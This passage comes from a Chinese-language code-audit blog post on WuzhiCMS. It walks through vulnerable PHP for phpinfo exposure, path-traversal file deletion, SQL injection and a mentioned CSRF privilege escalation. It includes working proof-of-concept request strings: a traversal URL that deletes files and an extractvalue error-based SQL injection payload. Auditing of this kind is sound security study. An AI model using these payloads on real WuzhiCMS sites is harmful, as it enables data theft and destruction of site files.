class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 显示 phpinfo 内容</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">phpinfo</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<br>    &#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080954694.png" alt="20250717125939730"></p><h3 id="coreframe-app-appupdate-admin-index-php"><a href="#coreframe-app-appupdate-admin-index-php" class="headerlink" title="coreframe&#x2F;app&#x2F;appupdate&#x2F;admin&#x2F;index.php"></a>coreframe&#x2F;app&#x2F;appupdate&#x2F;admin&#x2F;index.php</h3><p>如果 $filePath 为 ..&#x2F;..&#x2F;..&#x2F;index.php，则 COREFRAME_ROOT . ‘..&#x2F;..&#x2F;..&#x2F;index.php’ 就可以指向系统目录外的敏感文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_deleteFilesForPackageUpdate</span>(<span class="hljs-params"><span class="hljs-variable">$packageDir</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">$this</span>-&gt;filesystem-&gt;<span class="hljs-title function_ invoke__">exists</span>(<span class="hljs-variable">$packageDir</span>.<span class="hljs-string">&#x27;/delete&#x27;</span>)) &#123;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br><br>        <span class="hljs-variable">$handle</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$packageDir</span>.<span class="hljs-string">&#x27;/delete&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>);<br><br>        <span class="hljs-keyword">while</span> (<span class="hljs-variable">$filePath</span> = <span class="hljs-title function_ invoke__">fgets</span>(<span class="hljs-variable">$handle</span>)) &#123;<br>            <span class="hljs-variable">$filePath</span>= <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$filePath</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$filePath</span>,<span class="hljs-number">0</span>,<span class="hljs-number">9</span>)==<span class="hljs-string">&#x27;coreframe&#x27;</span>) &#123;<br>                <span class="hljs-variable">$fullPath</span> = COREFRAME_ROOT.<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$filePath</span>,<span class="hljs-number">9</span>);<br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;filesystem-&gt;<span class="hljs-title function_ invoke__">exists</span>(<span class="hljs-variable">$fullPath</span>)) &#123;<br>                    <span class="hljs-variable language_">$this</span>-&gt;filesystem-&gt;<span class="hljs-title function_ invoke__">remove</span>(<span class="hljs-variable">$fullPath</span>);<br>                &#125;<br>            &#125; <span class="hljs-keyword">elseif</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$filePath</span>,<span class="hljs-number">0</span>,<span class="hljs-number">3</span>)==<span class="hljs-string">&#x27;www&#x27;</span>) &#123;<br>                <span class="hljs-variable">$fullPath</span> = WWW_ROOT.<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$filePath</span>,<span class="hljs-number">3</span>);<br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;filesystem-&gt;<span class="hljs-title function_ invoke__">exists</span>(<span class="hljs-variable">$fullPath</span>)) &#123;<br>                    <span class="hljs-variable language_">$this</span>-&gt;filesystem-&gt;<span class="hljs-title function_ invoke__">remove</span>(<span class="hljs-variable">$fullPath</span>);<br>                &#125;<br>            &#125;<br><br>        &#125;<br><br>        <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$handle</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><h1 id="搜关键字"><a href="#搜关键字" class="headerlink" title="搜关键字"></a>搜关键字</h1><h2 id="文件安全："><a href="#文件安全：" class="headerlink" title="文件安全："></a>文件安全：</h2><h3 id="任意文件删除"><a href="#任意文件删除" class="headerlink" title="任意文件删除"></a>任意文件删除</h3><p>搜索del() -&gt; coreframe&#x2F;app&#x2F;attachment&#x2F;admin&#x2F;index.php -&gt; del()</p><p>有可控变量 $url </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">del</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$id</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;id&#x27;</span>]) ? <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;id&#x27;</span>] : <span class="hljs-string">&#x27;&#x27;</span>;<span class="hljs-comment">//从全局变量 $GLOBALS 中获取 id 和 url</span><br>        <span class="hljs-variable">$url</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;url&#x27;</span>]) ? <span class="hljs-title function_ invoke__">remove_xss</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;url&#x27;</span>]) : <span class="hljs-string">&#x27;&#x27;</span>;<span class="hljs-comment">//remove_xss() 函数用来清理 url 变量，防止 XSS 攻击</span><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$id</span> &amp;&amp; !<span class="hljs-variable">$url</span>) <span class="hljs-title function_ invoke__">MSG</span>(<span class="hljs-title function_ invoke__">L</span>(<span class="hljs-string">&#x27;operation_failure&#x27;</span>), HTTP_REFERER, <span class="hljs-number">3000</span>);<span class="hljs-comment">//判断是否都为空</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$id</span>) &#123;<span class="hljs-comment">//按 id 删除</span><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$id</span>)) &#123;<span class="hljs-comment">//将 id 转化为数组</span><br><span class="hljs-variable">$ids</span> = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$id</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$ids</span> = <span class="hljs-variable">$id</span>;<br>&#125;<br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$ids</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$id</span>) &#123;<br><span class="hljs-variable">$where</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;id&#x27;</span> =&gt; <span class="hljs-variable">$id</span>);<br><span class="hljs-variable">$att_info</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">get_one</span>(<span class="hljs-string">&#x27;attachment&#x27;</span>, <span class="hljs-variable">$where</span>, <span class="hljs-string">&#x27;usertimes,path&#x27;</span>);<span class="hljs-comment">//从 attachment 表中查找该 id的记录并取usertimes 和 path</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$att_info</span>[<span class="hljs-string">&#x27;usertimes&#x27;</span>] &gt; <span class="hljs-number">1</span>) &#123;<span class="hljs-comment">//若引用数大于 1，只减少使用次数，不删除物理文件</span><br><span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">update</span>(<span class="hljs-string">&#x27;attachment&#x27;</span>, <span class="hljs-string">&#x27;usertimes = usertimes-1&#x27;</span>, <span class="hljs-variable">$where</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">//否则，彻底删除</span><br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">my_unlink</span>(ATTACHMENT_ROOT . <span class="hljs-variable">$att_info</span>[<span class="hljs-string">&#x27;path&#x27;</span>]);<br><span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">delete</span>(<span class="hljs-string">&#x27;attachment&#x27;</span>, <span class="hljs-variable">$where</span>);<br><span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">delete</span>(<span class="hljs-string">&#x27;attachment_tag_index&#x27;</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;att_id&#x27;</span>=&gt;<span class="hljs-variable">$id</span>));<br>&#125;<br>&#125;<br><span class="hljs-title function_ invoke__">MSG</span>(<span class="hljs-title function_ invoke__">L</span>(<span class="hljs-string">&#x27;delete success&#x27;</span>), HTTP_REFERER, <span class="hljs-number">1000</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$url</span>) <span class="hljs-title function_ invoke__">MSG</span>(<span class="hljs-string">&#x27;url del &#x27;</span> . <span class="hljs-title function_ invoke__">L</span>(<span class="hljs-string">&#x27;operation_failure&#x27;</span>), HTTP_REFERER, <span class="hljs-number">3000</span>);<span class="hljs-comment">//按url 删除，如果没有 URL，报错返回。</span><br>            <span class="hljs-variable">$path</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(ATTACHMENT_URL, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$url</span>);<span class="hljs-comment">//将 URL 中的 ATTACHMENT_URL 去掉，得到文件相对路径 path</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$path</span>) &#123;<br>                <span class="hljs-variable">$where</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;path&#x27;</span> =&gt; <span class="hljs-variable">$path</span>);<span class="hljs-comment">//根据 path 查找数据库记录</span><br>                <span class="hljs-variable">$att_info</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">get_one</span>(<span class="hljs-string">&#x27;attachment&#x27;</span>, <span class="hljs-variable">$where</span>, <span class="hljs-string">&#x27;usertimes,id&#x27;</span>);<br><br>                <span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$att_info</span>)) &#123;<span class="hljs-comment">//如果没有记录，只删物理文件</span><br>                    <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">my_unlink</span>(ATTACHMENT_ROOT . <span class="hljs-variable">$path</span>);<br>                    <span class="hljs-title function_ invoke__">MSG</span>(<span class="hljs-title function_ invoke__">L</span>(<span class="hljs-string">&#x27;operation_success&#x27;</span>), HTTP_REFERER, <span class="hljs-number">3000</span>);<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$att_info</span>[<span class="hljs-string">&#x27;usertimes&#x27;</span>] &gt; <span class="hljs-number">1</span>) &#123;<span class="hljs-comment">//引用多次，只减引用次数</span><br>                    <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">update</span>(<span class="hljs-string">&#x27;attachment&#x27;</span>, <span class="hljs-string">&#x27;usertimes = usertimes-1&#x27;</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;id&#x27;</span> =&gt; <span class="hljs-variable">$att_info</span>[<span class="hljs-string">&#x27;id&#x27;</span>]));<br>                &#125;<br>                <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">my_unlink</span>(ATTACHMENT_ROOT . <span class="hljs-variable">$path</span>);<br>                    <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">delete</span>(<span class="hljs-string">&#x27;attachment&#x27;</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;id&#x27;</span> =&gt; <span class="hljs-variable">$att_info</span>[<span class="hljs-string">&#x27;id&#x27;</span>]));<br>                    <span class="hljs-title function_ invoke__">MSG</span>(<span class="hljs-title function_ invoke__">L</span>(<span class="hljs-string">&#x27;operation_success&#x27;</span>), HTTP_REFERER, <span class="hljs-number">3000</span>);<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-title function_ invoke__">MSG</span>(<span class="hljs-title function_ invoke__">L</span>(<span class="hljs-string">&#x27;operation_failure&#x27;</span>), HTTP_REFERER, <span class="hljs-number">3000</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>跟进my_unlink</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">my_unlink</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$path</span>)) <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$path</span>);<span class="hljs-comment">//文件存在直接删除</span><br>    &#125;<br></code></pre></td></tr></table></figure><p>index.php?m&#x3D;attachment&amp;f&#x3D;index&amp;v&#x3D;del&amp;_su&#x3D;wuzhicms&amp;url&#x3D;..&#x2F;..&#x2F;1.txt</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080955817.png" alt="20250717140708632"></p><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>搜索select</p><p>发现这里的很多参数都是原样拼接，可能存在风险</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//  coreframe/app/core/libs/class/mysqli.class.php</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_list</span>(<span class="hljs-params"><span class="hljs-variable">$table</span>, <span class="hljs-variable">$where</span> = <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$field</span> = <span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-variable">$limit</span> = <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$order</span> = <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$group</span> = <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$keyfield</span> = <span class="hljs-string">&#x27;&#x27;</span></span>) </span>&#123;<br><span class="hljs-variable">$arr</span> = <span class="hljs-keyword">array</span>();<br><span class="hljs-variable">$where</span> = <span class="hljs-variable">$where</span> ? <span class="hljs-string">&#x27; WHERE &#x27;</span>.<span class="hljs-variable">$where</span>: <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$field</span> = <span class="hljs-variable">$field</span> == <span class="hljs-string">&#x27;*&#x27;</span> ? <span class="hljs-string">&#x27;*&#x27;</span> : <span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">safe_filed</span>(<span class="hljs-variable">$field</span>);<br><span class="hljs-variable">$order</span> = <span class="hljs-variable">$order</span> ? <span class="hljs-string">&#x27; ORDER BY &#x27;</span>.<span class="hljs-variable">$order</span> : <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$group</span> = <span class="hljs-variable">$group</span> ? <span class="hljs-string">&#x27; GROUP BY &#x27;</span>.<span class="hljs-variable">$group</span> : <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$limit</span> = <span class="hljs-variable">$limit</span> ? <span class="hljs-string">&#x27; LIMIT &#x27;</span>.<span class="hljs-variable">$limit</span> : <span class="hljs-string">&#x27;&#x27;</span>;<br><br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&#x27;SELECT &#x27;</span>.<span class="hljs-variable">$field</span>.<span class="hljs-string">&#x27; FROM `&#x27;</span>.<span class="hljs-variable language_">$this</span>-&gt;tablepre.<span class="hljs-variable">$table</span>.<span class="hljs-string">&#x27;`&#x27;</span>.<span class="hljs-variable">$where</span>.<span class="hljs-variable">$group</span>.<span class="hljs-variable">$order</span>.<span class="hljs-variable">$limit</span>;<br><span class="hljs-variable">$query</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>);<br><span class="hljs-keyword">while</span>(<span class="hljs-variable">$data</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">fetch_array</span>(<span class="hljs-variable">$query</span>)) &#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$keyfield</span>) &#123;<br><span class="hljs-variable">$arr</span>[<span class="hljs-variable">$data</span>[<span class="hljs-variable">$keyfield</span>]] = <span class="hljs-variable">$data</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$arr</span>[] = <span class="hljs-variable">$data</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$arr</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>跟进get_list函数，最后只找到这里有可控变量 $fieldtype、$keywords</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// coreframe/app/promote/admin/index.php</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">search</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$siteid</span> = <span class="hljs-title function_ invoke__">get_cookie</span>(<span class="hljs-string">&#x27;siteid&#x27;</span>);<br>        <span class="hljs-variable">$page</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;page&#x27;</span>]) ? <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;page&#x27;</span>]) : <span class="hljs-number">1</span>;<br>        <span class="hljs-variable">$page</span> = <span class="hljs-title function_ invoke__">max</span>(<span class="hljs-variable">$page</span>,<span class="hljs-number">1</span>);<br>        <span class="hljs-variable">$fieldtype</span> = <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;fieldtype&#x27;</span>];<br>        <span class="hljs-variable">$keywords</span> = <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;keywords&#x27;</span>];<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$fieldtype</span>==<span class="hljs-string">&#x27;place&#x27;</span>) &#123;<br>            <span class="hljs-variable">$where</span> = <span class="hljs-string">&quot;`siteid`=&#x27;<span class="hljs-subst">$siteid</span>&#x27; AND `name` LIKE &#x27;%<span class="hljs-subst">$keywords</span>%&#x27;&quot;</span>;<br>            <span class="hljs-variable">$result</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">get_list</span>(<span class="hljs-string">&#x27;promote_place&#x27;</span>, <span class="hljs-variable">$where</span>, <span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">50</span>,<span class="hljs-variable">$page</span>,<span class="hljs-string">&#x27;pid ASC&#x27;</span>);<br>            <span class="hljs-variable">$pages</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;pages;<br>            <span class="hljs-variable">$total</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;number;<br>            <span class="hljs-keyword">include</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">template</span>(<span class="hljs-string">&#x27;listingplace&#x27;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$where</span> = <span class="hljs-string">&quot;`siteid`=&#x27;<span class="hljs-subst">$siteid</span>&#x27; AND `<span class="hljs-subst">$fieldtype</span>` LIKE &#x27;%<span class="hljs-subst">$keywords</span>%&#x27;&quot;</span>;<br>            <span class="hljs-variable">$result</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">get_list</span>(<span class="hljs-string">&#x27;promote&#x27;</span>,<span class="hljs-variable">$where</span>, <span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">20</span>,<span class="hljs-variable">$page</span>,<span class="hljs-string">&#x27;id DESC&#x27;</span>);<br>            <span class="hljs-variable">$pages</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;pages;<br>            <span class="hljs-variable">$total</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;number;<br>            <span class="hljs-keyword">include</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">template</span>(<span class="hljs-string">&#x27;listing&#x27;</span>);<br>        &#125;<br><br><br>    &#125;<br></code></pre></td></tr></table></figure><p>$fieldtype、$keywords俩个参数拼接到$where中，</p><p>构造poc:</p><p><code>index.php?m=promote&amp;f=index&amp;_su=wuzhicms&amp;v=search&amp;fieldtype=place&amp;keywords=1%27%20or%20extractvalue(1,concat(0x7e,user()))%20--+</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080955190.png" alt="20250717143106637"></p><h1 id="记一些知识点、函数"><a href="#记一些知识点、函数" class="headerlink" title="记一些知识点、函数"></a>记一些知识点、函数</h1><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso">$GLOBALS = <span class="hljs-built_in">array</span>();<span class="hljs-comment">//清除所有的全局变量</span><br></code></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">microtime函数返回当前 Unix 时间戳的微秒数。<br></code></pre></td></tr></table></figure><p>magic_quotes_runtime 的作用</p><p><a href="http://blog.csdn.net/tom_green/article/details/7039002">http://blog.csdn.net/tom_green/article/details/7039002</a></p><p>magic_quotes_gpc函数详解 </p><p><a href="https://www.cnblogs.com/timelesszhuang/p/3726736.html">https://www.cnblogs.com/timelesszhuang/p/3726736.html</a></p><h1 id="漏洞补充："><a href="#漏洞补充：" class="headerlink" title="漏洞补充："></a>漏洞补充：</h1><h2 id="CSRF漏洞"><a href="#CSRF漏洞" class="headerlink" title="CSRF漏洞"></a>CSRF漏洞</h2><p>五指CMS 4.1.0版本存在一个CSRF漏洞，当管理员登陆后访问下面CSRF测试页面可将普通用户提成为管理员权限。</p><h2 id="前台SQL注入"><a href="#前台SQL注入" class="headerlink" title="前台SQL注入"></a>前台SQL注入</h2><p>多个变量未使用引号包裹的SQL语句,只要是调用<code>get_one</code>这个函数的地方都存在SQL注入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_one</span>(<span class="hljs-params"><span class="hljs-variable">$table</span>, <span class="hljs-variable">$where</span>, <span class="hljs-variable">$field</span> = <span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-variable">$limit</span> = <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$order</span> = <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$group</span> = <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$condition</span> = <span class="hljs-literal">TRUE</span></span>) </span>&#123;<br><span class="hljs-variable">$where</span> = <span class="hljs-variable">$where</span> ? <span class="hljs-string">&#x27; WHERE &#x27;</span>.<span class="hljs-variable">$where</span>: <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$condition</span>) &#123;<br><span class="hljs-variable">$field</span> = <span class="hljs-variable">$field</span> == <span class="hljs-string">&#x27;*&#x27;</span> ? <span class="hljs-string">&#x27;*&#x27;</span> : <span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">safe_filed</span>(<span class="hljs-variable">$field</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$field</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">escape_string</span>(<span class="hljs-variable">$field</span>);<br>&#125;<br><span class="hljs-variable">$order</span> = <span class="hljs-variable">$order</span> ? <span class="hljs-string">&#x27; ORDER BY &#x27;</span>.<span class="hljs-variable">$order</span> : <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$group</span> = <span class="hljs-variable">$group</span> ? <span class="hljs-string">&#x27; GROUP BY &#x27;</span>.<span class="hljs-variable">$group</span> : <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$limit</span> = <span class="hljs-variable">$limit</span> ? <span class="hljs-string">&#x27; LIMIT &#x27;</span>.<span class="hljs-variable">$limit</span> : <span class="hljs-string">&#x27;&#x27;</span>;<br><br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&#x27;SELECT &#x27;</span>.<span class="hljs-variable">$field</span>.<span class="hljs-string">&#x27; FROM `&#x27;</span>.<span class="hljs-variable language_">$this</span>-&gt;tablepre.<span class="hljs-variable">$table</span>.<span class="hljs-string">&#x27;`&#x27;</span>.<span class="hljs-variable">$where</span>.<span class="hljs-variable">$group</span>.<span class="hljs-variable">$order</span>.<span class="hljs-variable">$limit</span>;<br><span class="hljs-variable">$query</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">fetch_array</span>(<span class="hljs-variable">$query</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>api&#x2F;sms_check.php,找到可控变量</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;WWW_ROOT&#x27;</span>,<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-keyword">__FILE__</span>), <span 